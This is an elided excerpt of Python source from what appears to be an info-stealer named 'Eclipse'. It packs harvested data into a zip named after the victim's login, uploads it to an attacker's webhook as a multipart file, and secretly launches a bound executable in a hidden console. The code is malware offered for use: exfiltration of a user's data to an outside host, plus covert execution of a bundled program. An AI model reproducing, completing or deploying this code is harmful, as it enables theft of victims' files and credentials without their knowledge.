...
def main(webhook: str):
    ...
    _zipfile = os.path.join(localappdata, f"Eclipse-Logged-{os.getlogin()}.zip")
    ...
    _file = f"{localappdata}\\Eclipse-Logged-{os.getlogin()}.zip"
            ...
            encoder = MultipartEncoder(
                {
                    ...
                    "file": (
                        f"Eclipse-Logged-{os.getlogin()}.zip",
                        file,
                        "application/zip",
                    ),
                }
...
def Eclipse(webhook: str):
    ...
    if (
        isExecutable
        and (__CONFIG__["bound_startup"] or not inStartup)
        and os.path.isfile(boundFileSrc := os.path.join(sys._MEIPASS, "bound.eclipse"))
    ):
        ...
        subprocess.Popen(
            "start bound.exe",
            shell=True,
            cwd=os.path.dirname(boundFileDst),
            creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE,
        )
